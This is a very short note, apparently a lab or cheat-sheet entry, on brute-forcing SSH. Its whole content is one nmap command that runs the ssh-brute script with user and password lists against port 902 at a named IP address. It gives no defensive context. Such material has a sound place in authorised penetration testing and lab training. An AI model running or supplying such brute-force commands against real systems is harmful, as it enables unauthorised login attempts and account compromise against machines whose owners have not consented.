## SSH Bruteforce
Using nmap to bruteforce SSH with 1 user and 40 passwords in port 902/TCP with SSH.

Command
`nmap -p 902 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst,ssh-brute.timeout=4s 147.32.80.37 -sV`
